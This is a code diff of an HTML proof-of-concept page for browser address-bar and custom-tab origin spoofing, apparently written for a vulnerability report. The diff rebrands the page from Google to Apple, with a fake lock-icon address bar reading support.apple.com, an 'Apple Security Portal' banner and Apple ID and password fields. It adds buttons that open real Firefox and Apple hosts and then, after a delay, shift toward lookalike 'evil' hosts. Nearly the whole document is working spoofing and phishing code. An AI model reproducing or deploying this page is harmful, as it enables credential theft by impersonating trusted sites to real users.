@@ -6,8 +6,8 @@
     <title>Advanced Custom Tab Verification PoC</title>
     <style>
         :root {
-            --primary-color: #1a73e8;
-            --primary-hover: #1557b0;
+            --primary-color: #0071e3;
+            --primary-hover: #0077ed;
             --bg-color: #f8f9fa;
             --text-color: #202124;
             --border-color: #dadce0;
@@ -120,9 +120,18 @@
             font-size: 14px;
             border-radius: 8px;
             border: none;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            box-shadow: 0 4px 10px rgba(0, 113, 227, 0.25);
             transition: background-color 0.2s, transform 0.1s;
             cursor: pointer;
+        }
+
+        .spoof-btn.secondary {
+            background-color: #5f6368;
+            box-shadow: 0 4px 10px rgba(95, 99, 104, 0.25);
+        }
+
+        .spoof-btn.secondary:active {
+            background-color: #3c4043;
         }
 
         .spoof-btn:active {
@@ -156,18 +165,20 @@
     <div class="fake-address-bar">
         <div class="fake-url-container">
             <span class="lock-icon">🔒</span>
-            <span class="url-text">https://</span><span class="url-domain" id="displayDomain">security.google.com/verify</span>
+            <span class="url-text">https://</span><span class="url-domain" id="displayDomain">support.apple.com/verify</span>
         </div>
     </div>
 
-    <div class="banner">Google Security Portal</div>
+    <div class="banner">Apple Security Portal</div>
     <h1>Secure Session Handler</h1>
 
     <div class="card-container">
-        <input type="text" id="userInput" placeholder="Username or Email" value="user@secure-portal.local">
+        <input type="text" id="userInput" placeholder="Apple ID or Email" value="user@icloud.com">
         <input type="password" id="passInput" placeholder="Password" value="••••••••••••">
         
-        <button class="spoof-btn" id="launchBtn">Initialize Secure Context</button>
+        <!-- Dua Tombol dengan Target Berbeda -->
+        <button class="spoof-btn" id="launchFirefoxBtn">Launch Firefox Target</button>
+        <button class="spoof-btn secondary" id="launchAppleBtn">Launch Apple Target</button>
         
         <div class="status-log" id="logBox">Status: Awaiting user interaction...</div>
     </div>
@@ -183,32 +194,26 @@
             logBox.scrollTop = logBox.scrollHeight;
         }
 
-        // Parameter dinamis untuk simulasi transisi lintas-asal (cross-origin transition)
         const urlParams = new URLSearchParams(window.location.search);
-        const targetVictimHost = urlParams.get('a') || "call.support.google.com";
-        const targetEvilHost = urlParams.get('b') || "call.support.google.com.evil.localtest.me";
         const delayTime = parseInt(urlParams.get('d')) || 4000;
 
-        document.getElementById("launchBtn").addEventListener("click", () => {
+        function handleLaunch(targetHost, targetEvilHost) {
             if (isProcessing) return;
             isProcessing = true;
 
-            // Picu getar perangkat (haptic feedback) jika didukung
             if (navigator.vibrate) {
                 navigator.vibrate(40);
             }
 
-            appendLog("Opening secure window context -> " + targetVictimHost);
+            appendLog("Opening secure window context -> " + targetHost);
             
-            // Simulasikan pembukaan jendela lintas-asal (Varian 2 konsep pelapor)
             let openedWindow = null;
             try {
-                openedWindow = window.open("https://" + targetVictimHost + "/", "_blank");
+                openedWindow = window.open("https://" + targetHost + "/", "_blank");
             } catch (err) {
                 appendLog("Popup restricted, switching to single-tab flow.");
             }
 
-            // Simulasi jeda waktu sebelum navigasi mutasi domain dipicu
             setTimeout(() => {
                 try {
                     appendLog("Executing delayed origin mutation...");
@@ -226,6 +231,20 @@
                     setTimeout(() => { isProcessing = false; }, 1000);
                 }
             }, delayTime);
+        }
+
+        // Event Listener Tombol 1: Firefox Target
+        document.getElementById("launchFirefoxBtn").addEventListener("click", () => {
+            const targetHost = urlParams.get('a') || "detectportal.firefox.com";
+            const targetEvilHost = urlParams.get('b') || "detectportal.firefox.com.evil.localtest.me";
+            handleLaunch(targetHost, targetEvilHost);
+        });
+
+        // Event Listener Tombol 2: Apple Target
+        document.getElementById("launchAppleBtn").addEventListener("click", () => {
+            const targetHost = urlParams.get('a2') || "support.apple.com";
+            const targetEvilHost = urlParams.get('b2') || "support.apple.com.evil.localtest.me";
+            handleLaunch(targetHost, targetEvilHost);
         });
     </script>
 
